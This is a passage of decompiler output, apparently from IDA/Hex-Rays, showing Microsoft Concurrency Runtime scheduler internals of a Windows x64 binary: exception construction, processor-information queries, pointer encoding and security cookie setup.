  int v8; // edx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  MEMORY[0x76FBBCC0](0i64, a1);
  if ( (unsigned int)MEMORY[0x76F91760]() != 122 )
  {
    v5 = MEMORY[0x76F91760]();
    v6 = (unsigned __int16)v5 | 0x80070000;
    if ( v5 <= 0 )
      v6 = v5;
    sub_13F142E40((__int64)pExceptionObject, v6);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v2 = sub_13F16A298(*a1);
  v3 = v2;
  if ( !v2 )
  {
    sub_13F109748(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !(unsigned int)MEMORY[0x76FBBCC0](v2, a1) )
  {
    v7 = MEMORY[0x76F91760]();
    v8 = (unsigned __int16)v7 | 0x80070000;
    if ( v7 <= 0 )
      v8 = v7;
    sub_13F142E40((__int64)pExceptionObject, v8);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v3;
}
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F1423D4: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1424A0) ----------------------------------------------------
__int64 __fastcall sub_13F1424A0(unsigned int a1, unsigned int *a2)
{
  __int64 v4; // rax
  unsigned int (__fastcall *v5)(_QWORD, __int64, unsigned int *); // rax
  unsigned int (__fastcall *v6)(_QWORD, __int64, unsigned int *); // rsi
  __int64 v7; // rax
  __int64 v8; // rbx
  int v10; // eax
  int v11; // edx
  int v12; // eax
  int v13; // edx
  int v14; // eax
  int v15; // edx
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  v4 = MEMORY[0x76F920C0](L"kernel32.dll");
  v5 = (unsigned int (__fastcall *)(_QWORD, __int64, unsigned int *))MEMORY[0x76F92020](
                                                                       v4,
                                                                       "GetLogicalProcessorInformationEx");
  v6 = v5;
  if ( !v5 )
  {
    v10 = MEMORY[0x76F91760]();
    v11 = (unsigned __int16)v10 | 0x80070000;
    if ( v10 <= 0 )
      v11 = v10;
    sub_13F142E40((__int64)pExceptionObject, v11);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v5(a1, 0i64, a2);
  if ( (unsigned int)MEMORY[0x76F91760]() != 122 )
  {
    v12 = MEMORY[0x76F91760]();
    v13 = (unsigned __int16)v12 | 0x80070000;
    if ( v12 <= 0 )
      v13 = v12;
    sub_13F142E40((__int64)pExceptionObject, v13);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  v7 = sub_13F16A298(*a2);
  v8 = v7;
  if ( !v7 )
  {
    sub_13F109748(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  if ( !v6(a1, v7, a2) )
  {
    v14 = MEMORY[0x76F91760]();
    v15 = (unsigned __int16)v14 | 0x80070000;
    if ( v14 <= 0 )
      v15 = v14;
    sub_13F142E40((__int64)pExceptionObject, v15);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v8;
}
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F181660: using guessed type wchar_t aKernel32Dll[13];
// 13F1424A0: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F1425E8) ----------------------------------------------------
__int64 sub_13F1425E8()
{
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF
  unsigned int v4; // [rsp+50h] [rbp+8h] BYREF

  if ( !(unsigned int)MEMORY[0x76FBD7B0](&v4) )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v4;
}

//----- (000000013F142634) ----------------------------------------------------
__int64 __fastcall sub_13F142634(__int64 a1, __int64 a2)
{
  void (__fastcall *v4)(__int64, __int64); // rax
  __int64 v5; // rax
  __int64 v7; // [rsp+40h] [rbp+18h] BYREF
  char v8; // [rsp+48h] [rbp+20h] BYREF

  if ( (int)sub_13F1454C0() < 4 )
  {
    v5 = MEMORY[0x76F85190]();
    MEMORY[0x76F72970](v5, &v7, &v8);
    *(_WORD *)(a2 + 8) = 0;
    *(_QWORD *)a2 = v7;
  }
  else
  {
    v4 = (void (__fastcall *)(__int64, __int64))sub_13F142890(0i64);
    v4(a1, a2);
  }
  return 1i64;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1426B0) ----------------------------------------------------
__int64 sub_13F1426B0()
{
  return sub_13F10AB90();
}

//----- (000000013F1426B8) ----------------------------------------------------
__int64 __fastcall sub_13F1426B8(__int64 a1, __int64 a2, __int64 a3)
{
  int v4; // eax
  int v5; // edx
  char pExceptionObject[40]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v7; // [rsp+78h] [rbp+20h] BYREF

  if ( !(unsigned int)MEMORY[0x76F7EDF0](&v7, a1, a2, a3, -1, 12) )
  {
    v4 = MEMORY[0x76F91760]();
    v5 = (unsigned __int16)v4 | 0x80070000;
    if ( v4 <= 0 )
      v5 = v4;
    sub_13F142E40((__int64)pExceptionObject, v5);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return v7;
}

//----- (000000013F14271C) ----------------------------------------------------
__int64 __fastcall sub_13F14271C(__int64 a1, _QWORD *a2)
{
  void (__fastcall *v4)(__int64, _QWORD *, _QWORD); // rax

  if ( (int)sub_13F1454C0() < 4 )
  {
    MEMORY[0x76F74E00](a1, *a2);
  }
  else
  {
    v4 = (void (__fastcall *)(__int64, _QWORD *, _QWORD))sub_13F142890(0i64);
    v4(a1, a2, 0i64);
  }
  return 1i64;
}
// 13F1454C0: using guessed type __int64 sub_13F1454C0(void);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5D18: using guessed type __int64 qword_13F1C5D18;

//----- (000000013F142770) ----------------------------------------------------
__int64 sub_13F142770()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  result = MEMORY[0x76F8CDC0]();
  if ( !(_DWORD)result )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}

//----- (000000013F1427CC) ----------------------------------------------------
__int64 sub_13F1427CC()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  result = MEMORY[0x76F865A0]();
  if ( (_DWORD)result == -1 )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}

//----- (000000013F142820) ----------------------------------------------------
__int64 sub_13F142820()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // edx
  char pExceptionObject[40]; // [rsp+20h] [rbp-28h] BYREF

  result = MEMORY[0x76F85170]();
  if ( !(_DWORD)result )
  {
    v1 = MEMORY[0x76F91760]();
    v2 = (unsigned __int16)v1 | 0x80070000;
    if ( v1 <= 0 )
      v2 = v1;
    sub_13F142E40((__int64)pExceptionObject, v2);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return result;
}

//----- (000000013F14286C) ----------------------------------------------------
void sub_13F14286C()
{
  JUMPOUT(0x76F91980i64);
}
// 13F14286F: control flows out of bounds to 76F91980

//----- (000000013F142878) ----------------------------------------------------
void sub_13F142878()
{
  ;
}
// 13F1C5D38: using guessed type __int64 qword_13F1C5D38;

//----- (000000013F142890) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F142890(__int64 a1)
{
  return a1 ^ 0xE43F81AFC22E9630ui64;
}

//----- (000000013F14289C) ----------------------------------------------------
__int64 sub_13F14289C()
{
  sub_13F10ABF0();
  sub_13F10AC80();
  sub_13F10A8FC();
  return sub_13F148BC4();
}
// 13F1C5D38: using guessed type __int64 qword_13F1C5D38;

//----- (000000013F1428E4) ----------------------------------------------------
__int64 sub_13F1428E4()
{
  __int64 result; // rax

  result = (unsigned int)_InterlockedExchangeAdd(&dword_13F1C5D30, 0xFFFFFFFF);
  if ( (_DWORD)result == 1 )
    return sub_13F148BC4();
  return result;
}
// 13F1C5D30: using guessed type int dword_13F1C5D30;
// 13F1C5D38: using guessed type __int64 qword_13F1C5D38;

//----- (000000013F14291C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
uintptr_t sub_13F14291C()
{
  uintptr_t v0; // rbx
  __int64 v1; // rax
  char v3; // [rsp+40h] [rbp+8h] BYREF
  __int64 v4; // [rsp+48h] [rbp+10h] BYREF

  dword_13F1C5DD0 = 1;
  v0 = _security_cookie ^ MEMORY[0x771C0850](&qword_13F1C5DF0);
  v1 = MEMORY[0x76F833C0]();
  if ( (unsigned int)MEMORY[0x76FBB350](v1, &v4, &v3, &v3, &v3) )
    v0 ^= v4;
  return v0;
}
// 13F142929: write access to const memory at 13F1C5DD0 has been detected
// 13F1C5DD0: using guessed type int dword_13F1C5DD0;
// 13F1C5DF0: using guessed type __int64 qword_13F1C5DF0;

//----- (000000013F142980) ----------------------------------------------------
__int64 __fastcall sub_13F142980(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = sub_13F142340(a1, a2);
  if ( v2 && _InterlockedIncrement(&dword_13F1C5D30) == 1 )
  {
    sub_13F1429D0();
    _InterlockedIncrement(&dword_13F1B71D4);
  }
  return v2;
}
// 13F142340: using guessed type __int64 __fastcall sub_13F142340(_QWORD, _QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5D30: using guessed type int dword_13F1C5D30;

//----- (000000013F1429D0) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1429D0()
{
  __int64 result; // rax
  int v1; // eax
  int v2; // eax
  int v3; // edx
  char pExceptionObject[32]; // [rsp+20h] [rbp-248h] BYREF
  char v5[528]; // [rsp+40h] [rbp-228h] BYREF

  result = MEMORY[0x76F85A80](0i64);
  if ( 0x13F100000i64 != result )
  {
    v1 = MEMORY[0x76F86BA0](0x13F100000ui64, v5, 260i64);
    if ( !v1 || v1 == 260 )
    {
      v2 = MEMORY[0x76F91760]();
      v3 = (unsigned __int16)v2 | 0x80070000;
      if ( v2 <= 0 )
        v3 = v2;
      sub_13F142E40((__int64)pExceptionObject, v3);
      CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
    }
    result = MEMORY[0x76F85AE0](v5, 0i64, 0i64);
    qword_13F1C5D38 = result;
  }
  return result;
}
// 13F142A29: write access to const memory at 13F1C5D38 has been detected
// 13F1C5D38: using guessed type __int64 qword_13F1C5D38;

//----- (000000013F142A78) ----------------------------------------------------
__int64 __fastcall sub_13F142A78()
{
  __int64 result; // rax
  __int64 v1; // rbx

  result = sub_13F10A9CC();
  v1 = result;
  if ( result )
  {
    sub_13F1429D0();
    _InterlockedIncrement(&dword_13F1B71D4);
    sub_13F10ABF0();
    return v1;
  }
  return result;
}
// 13F1B71D4: using guessed type int dword_13F1B71D4;

//----- (000000013F142AEC) ----------------------------------------------------
__int64 __fastcall sub_13F142AEC()
{
  __int64 result; // rax
  __int64 v1; // rbx

  result = sub_13F10A9E8();
  v1 = result;
  if ( result )
  {
    sub_13F1429D0();
    _InterlockedIncrement(&dword_13F1B71D4);
    sub_13F10AC10();
    return v1;
  }
  return result;
}
// 13F1B71D4: using guessed type int dword_13F1B71D4;

//----- (000000013F142B40) ----------------------------------------------------
__int64 sub_13F142B40()
{
  sub_13F10ABF0();
  sub_13F10A8FC();
  return sub_13F148BC4();
}

//----- (000000013F142B8C) ----------------------------------------------------
__int64 sub_13F142B8C()
{
  sub_13F10AC10();
  sub_13F10A91C();
  return sub_13F148BC4();
}
// 13F1C5D38: using guessed type __int64 qword_13F1C5D38;

//----- (000000013F142BD8) ----------------------------------------------------
__int64 __fastcall sub_13F142BD8(volatile __int32 *a1)
{
  __int64 result; // rax
  char v3[8]; // [rsp+20h] [rbp-28h] BYREF
  int v4; // [rsp+28h] [rbp-20h]
  __int64 (__fastcall *v5)(); // [rsp+30h] [rbp-18h]

  sub_13F14EF64();
  result = (unsigned int)_InterlockedExchange(a1, 1);
  if ( (_DWORD)result )
  {
    v4 = 0;
    v5 = sub_13F142C2C;
    do
    {
      sub_13F141BF4((__int64)v3);
      result = (unsigned int)_InterlockedExchange(a1, 1);
    }
    while ( (_DWORD)result );
  }
  return result;
}
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);
// 13F142BD8: using guessed type char var_28[8];

//----- (000000013F142C20) ----------------------------------------------------
__int64 __fastcall sub_13F142C20(_DWORD *a1)
{
  *a1 = 0;
  return sub_13F14EF64();
}
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);

//----- (000000013F142C2C) ----------------------------------------------------
__int64 sub_13F142C2C()
{
  return sub_13F1427BC(0i64);
}
// 13F1427BC: using guessed type __int64 __fastcall sub_13F1427BC(_QWORD);
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();

//----- (000000013F142C34) ----------------------------------------------------
char __fastcall sub_13F142C34(volatile __int32 *a1)
{
  char v2; // bl

  sub_13F14EF64();
  if ( *a1 || (v2 = 1, _InterlockedExchange(a1, 1)) )
  {
    v2 = 0;
    sub_13F14EF64();
  }
  return v2;
}
// 13F14EF64: using guessed type __int64 sub_13F14EF64(void);

//----- (000000013F142C6C) ----------------------------------------------------
__int64 sub_13F142C6C()
{
  __int64 v0; // rax

  v0 = sub_13F14BB58();
  if ( v0 )
    return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v0 + 64i64))(v0);
  else
    return sub_13F1427C4();
}
// 13F1427C4: using guessed type __int64 sub_13F1427C4(void);
// 13F142C6C: using guessed type __int64 __fastcall sub_13F142C6C();
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F142C9C) ----------------------------------------------------
_QWORD *__fastcall sub_13F142C9C(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189E48;
  return a1;
}
// 13F189E48: using guessed type __int64 (__fastcall *off_13F189E48[3])();

//----- (000000013F142CB4) ----------------------------------------------------
_QWORD *__fastcall sub_13F142CB4(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189E30;
  return a1;
}
// 13F189E30: using guessed type __int64 (__fastcall *off_13F189E30[3])();

//----- (000000013F142CCC) ----------------------------------------------------
_QWORD *__fastcall sub_13F142CCC(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = &Concurrency::improper_lock::`vftable';
  return a1;
}
// 13F189D10: using guessed type void *Concurrency::improper_lock::`vftable';

//----- (000000013F142D18) ----------------------------------------------------
_QWORD *__fastcall sub_13F142D18(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189E00;
  return a1;
}
// 13F189E00: using guessed type __int64 (__fastcall *off_13F189E00[3])();

//----- (000000013F142D30) ----------------------------------------------------
_QWORD *__fastcall sub_13F142D30(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189E18;
  return a1;
}
// 13F189E18: using guessed type __int64 (__fastcall *off_13F189E18[3])();

//----- (000000013F142D48) ----------------------------------------------------
_QWORD *__fastcall sub_13F142D48(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189ED8;
  return a1;
}
// 13F189ED8: using guessed type __int64 (__fastcall *off_13F189ED8[2])();

//----- (000000013F142D60) ----------------------------------------------------
_QWORD *__fastcall sub_13F142D60(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = off_13F189E78;
  return a1;
}
// 13F189E78: using guessed type __int64 (__fastcall *off_13F189E78[3])();

//----- (000000013F142DAC) ----------------------------------------------------
_QWORD *__fastcall sub_13F142DAC(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189EA8;
  return a1;
}
// 13F189EA8: using guessed type __int64 (__fastcall *off_13F189EA8[3])();

//----- (000000013F142DC4) ----------------------------------------------------
_QWORD *__fastcall sub_13F142DC4(_QWORD *a1, __int64 a2)
{
  __int64 v4; // [rsp+20h] [rbp-18h] BYREF
  char v5; // [rsp+28h] [rbp-10h]

  v5 = 1;
  v4 = a2;
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C((__int64)&v4, (__int64)(a1 + 1));
  *a1 = off_13F189E90;
  return a1;
}
// 13F189E90: using guessed type __int64 (__fastcall *off_13F189E90[3])();

//----- (000000013F142E10) ----------------------------------------------------
_QWORD *__fastcall sub_13F142E10(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189E60;
  return a1;
}
// 13F189E60: using guessed type __int64 (__fastcall *off_13F189E60[3])();

//----- (000000013F142E28) ----------------------------------------------------
_QWORD *__fastcall sub_13F142E28(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189EC0;
  return a1;
}
// 13F189EC0: using guessed type __int64 (__fastcall *off_13F189EC0[3])();

//----- (000000013F142E40) ----------------------------------------------------
__int64 __fastcall sub_13F142E40(__int64 a1, int a2)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = &Concurrency::scheduler_resource_allocation_error::`vftable';
  result = a1;
  *(_DWORD *)(a1 + 24) = a2;
  return result;
}
// 13F189D40: using guessed type void *Concurrency::scheduler_resource_allocation_error::`vftable';

//----- (000000013F142E5C) ----------------------------------------------------
__int64 __fastcall sub_13F142E5C(__int64 a1, int a2)
{
  __int64 result; // rax

  *(_QWORD *)(a1 + 8) = 0i64;
  *(_QWORD *)(a1 + 16) = 0i64;
  *(_QWORD *)a1 = &Concurrency::scheduler_worker_creation_error::`vftable';
  result = a1;
  *(_DWORD *)(a1 + 24) = a2;
  return result;
}
// 13F189DD0: using guessed type void *Concurrency::scheduler_worker_creation_error::`vftable';

//----- (000000013F142E78) ----------------------------------------------------
_QWORD *__fastcall sub_13F142E78(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = off_13F189DE8;
  return a1;
}
// 13F189DE8: using guessed type __int64 (__fastcall *off_13F189DE8[3])();

//----- (000000013F142E90) ----------------------------------------------------
__int64 __fastcall sub_13F142E90()
{
  _QWORD *v0; // rcx

  v0 = sub_13F1490A8();
  return (*(__int64 (__fastcall **)(_QWORD *))(*v0 + 48i64))(v0);
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F142ED0) ----------------------------------------------------
_QWORD *__fastcall sub_13F142ED0()
{
  return sub_13F1490A8();
}
// 13F142818: using guessed type __int64 __fastcall sub_13F142818(_QWORD);
// 13F1B71D4: using guessed type int dword_13F1B71D4;
// 13F1C5DB0: using guessed type int dword_13F1C5DB0;

//----- (000000013F142EFC) ----------------------------------------------------
_QWORD *__fastcall sub_13F142EFC(_QWORD *a1, __int64 a2)
{
  *a1 = 0i64;
  a1[1] = 0i64;
  sub_13F142634(a2, (__int64)a1);
  return a1;
}

//----- (000000013F142F28) ----------------------------------------------------
__int64 __fastcall sub_13F142F28(__int64 a1)
{
  _BYTE *v2; // rax
  unsigned __int128 v3; // rax
  __int64 pExceptionObject[4]; // [rsp+28h] [rbp-20h] BYREF

  *(_QWORD *)a1 = off_13F18A1D0;
  *(_DWORD *)(a1 + 8) = 0;
  *(_DWORD *)(a1 + 12) = 0;
  *(_QWORD *)(a1 + 16) = 16i64;
  *(_DWORD *)(a1 + 40) = 0;
  *(_DWORD *)(a1 + 44) = 0;
  sub_13F1416E8(a1 + 48);
  *(_QWORD *)(a1 + 88) = 0i64;
  *(_QWORD *)(a1 + 96) = 0i64;
  *(_QWORD *)(a1 + 104) = 0i64;
  *(_QWORD *)(a1 + 112) = 0i64;
  *(_QWORD *)(a1 + 120) = 0i64;
  *(_QWORD *)(a1 + 128) = 0i64;
  *(_QWORD *)(a1 + 136) = 0i64;
  *(_DWORD *)(a1 + 144) = 0;
  *(_QWORD *)(a1 + 152) = 0i64;
  sub_13F15382C(a1 + 160);
  sub_13F145B08();
  sub_13F143B30(a1);
  v2 = (_BYTE *)MEMORY[0x76F85C40](0i64, 4096i64, 12288i64, 4i64, -2i64);
  *(_QWORD *)(a1 + 224) = v2;
  if ( !v2 )
  {
    sub_13F109748(pExceptionObject);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVbad_alloc_std__);
  }
  *v2 = 1;
  *(_QWORD *)(a1 + 112) = sub_13F1422EC();
  v3 = *(unsigned int *)(a1 + 16) * (unsigned __int128)8ui64;
  if ( !is_mul_ok(*(unsigned int *)(a1 + 16), 8ui64) )
    *(_QWORD *)&v3 = -1i64;
  *(_QWORD *)(a1 + 120) = sub_13F1790C4(v3, *((_QWORD *)&v3 + 1));
  return a1;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F18A1D0: using guessed type __int64 (__fastcall *off_13F18A1D0[6])();
// 13F1C5D90: using guessed type int dword_13F1C5D90;
// 13F142F28: using guessed type _QWORD pExceptionObject[4];

//----- (000000013F143048) ----------------------------------------------------
_QWORD *__fastcall sub_13F143048(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = &Concurrency::invalid_operation::`vftable';
  return a1;
}
// 13F18A170: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (000000013F143088) ----------------------------------------------------
_QWORD *__fastcall sub_13F143088(_QWORD *a1)
{
  a1[1] = 0i64;
  a1[2] = 0i64;
  *a1 = &Concurrency::invalid_operation::`vftable';
  return a1;
}
// 13F18A170: using guessed type void *Concurrency::invalid_operation::`vftable';

//----- (000000013F1430A0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1430A0(_QWORD *a1, __int64 a2)
{
  *a1 = &std::exception::`vftable';
  a1[1] = 0i64;
  a1[2] = 0i64;
  sub_13F15E46C(a2 + 8, (__int64)(a1 + 1));
  *a1 = off_13F189DE8;
  return a1;
}
// 13F189DE8: using guessed type __int64 (__fastcall *off_13F189DE8[3])();

//----- (000000013F1430E0) ----------------------------------------------------
__int64 __fastcall sub_13F1430E0(__int64 a1)
{
  return sub_13F14088C(*(_QWORD *)(a1 + 56), 16i64);
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F1430F0) ----------------------------------------------------
__int64 __fastcall sub_13F1430F0(__int64 a1, __int64 a2)
{
  unsigned int i; // esi
  __int64 v4; // rcx
  _QWORD *v5; // rbx
  __int64 v6; // rcx
  _QWORD *v7; // rbx
  __int64 v8; // rcx
  __int64 v9; // rdx
  __int64 v10; // rcx
  __int64 v11; // rdx
  __int64 v12; // rdx

  *(_QWORD *)a1 = off_13F18A1D0;
  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
  {
    v4 = *(_QWORD *)(((unsigned __int64)i << 6) + *(_QWORD *)(a1 + 96) + 48);
    if ( v4 )
    {
      v5 = (_QWORD *)(v4 - 8);
      sub_13F140ECC(v4, 48i64, *(_QWORD *)(v4 - 8));
      sub_13F140F9C(v5, 48i64 * *v5 + 8);
    }
  }
  v6 = *(_QWORD *)(a1 + 96);
  if ( v6 )
  {
    v7 = (_QWORD *)(v6 - 8);
    sub_13F140ECC(v6, 64i64, *(_QWORD *)(v6 - 8));
    sub_13F140F9C(v7, (*v7 << 6) + 8i64);
  }
  sub_13F14088C(*(_QWORD *)(a1 + 88), a2);
  v8 = *(_QWORD *)(a1 + 224);
  if ( v8 )
    MEMORY[0x76F80700](v8, 0i64, 0x8000i64);
  MEMORY[0x76F91910](*(_QWORD *)(a1 + 112));
  sub_13F14088C(*(_QWORD *)(a1 + 120), v9);
  v10 = *(_QWORD *)(a1 + 104);
  if ( v10 )
  {
    sub_13F1422E4(v10);
    sub_13F14088C(*(_QWORD *)(a1 + 128), v11);
    sub_13F14088C(*(_QWORD *)(a1 + 136), v12);
  }
  sub_13F153868((__int64 *)(a1 + 160));
  return sub_13F1417C0(a1 + 48);
}
// 13F1431A3: variable 'a2' is possibly undefined
// 13F1431D3: variable 'v9' is possibly undefined
// 13F1431EF: variable 'v11' is possibly undefined
// 13F1431FC: variable 'v12' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F140F9C: using guessed type __int64 __fastcall sub_13F140F9C(_QWORD, _QWORD);
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F1422E4: using guessed type __int64 __fastcall sub_13F1422E4(_QWORD);
// 13F18A1D0: using guessed type __int64 (__fastcall *off_13F18A1D0[6])();

//----- (000000013F143228) ----------------------------------------------------
__int64 __fastcall sub_13F143228(_QWORD *a1)
{
  return sub_13F141BDC(*a1);
}
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F143250) ----------------------------------------------------
__int64 __fastcall sub_13F143250(__int64 a1, int a2, unsigned int a3, __int64 a4)
{
  unsigned int v5; // ebx
  __int64 v6; // r8
  double v7; // xmm1_8
  __int64 v8; // r11
  __int64 v9; // rdx
  __int64 v10; // r8
  __int64 v11; // rdx

  v5 = a2;
  if ( a2 >= a3 )
  {
    v10 = 0i64;
    if ( (_DWORD)a4 )
    {
      a4 = (unsigned int)a4;
      do
      {
        v11 = *(_QWORD *)(v10 + *(_QWORD *)(a1 + 136));
        v10 += 8i64;
        *(_DWORD *)(v11 + 4) = *(_DWORD *)(v11 + 36) - *(_DWORD *)(*(_QWORD *)(v11 + 16) + 208i64);
        --a4;
      }
      while ( a4 );
    }
    return a3;
  }
  else if ( (_DWORD)a4 == 1 )
  {
    *(_DWORD *)(**(_QWORD **)(a1 + 136) + 4i64) = a2;
  }
  else
  {
    v6 = 0i64;
    v7 = (double)a2 / (double)(int)a3;
    if ( (_DWORD)a4 )
    {
      v8 = (unsigned int)a4;
      do
      {
        v9 = *(_QWORD *)(v6 + *(_QWORD *)(a1 + 136));
        v6 += 8i64;
        *(double *)(v9 + 8) = (double)(*(_DWORD *)(v9 + 36) - *(_DWORD *)(*(_QWORD *)(v9 + 16) + 208i64)) * v7;
        --v8;
      }
      while ( v8 );
    }
    sub_13F1472EC(*(__int64 **)(a1 + 136), a4);
  }
  return v5;
}

//----- (000000013F143324) ----------------------------------------------------
void sub_13F143324()
{
  ;
}

//----- (000000013F1433E0) ----------------------------------------------------
__int64 __fastcall sub_13F1433E0(__int64 *a1)
{
  __int64 result; // rax
  __int64 v3; // [rsp+20h] [rbp-18h]

  v3 = *a1;
  sub_13F143324();
  result = v3;
  *a1 = v3;
  return result;
}

//----- (000000013F143410) ----------------------------------------------------
__int64 __fastcall sub_13F143410(_QWORD *a1, __int64 a2)
{
  return sub_13F14271C(a2, a1);
}

//----- (000000013F143420) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F143420()
{
  __int64 v0; // rax
  int v2; // eax
  int v3; // edx
  char pExceptionObject[8]; // [rsp+30h] [rbp-38h] BYREF

  v0 = MEMORY[0x76F85190]();
  if ( !(unsigned int)MEMORY[0x76F72970](v0, &qword_13F1C5D60, &qword_13F1C5D68) )
  {
    v2 = MEMORY[0x76F91760]();
    v3 = (unsigned __int16)v2 | 0x80070000;
    if ( v2 <= 0 )
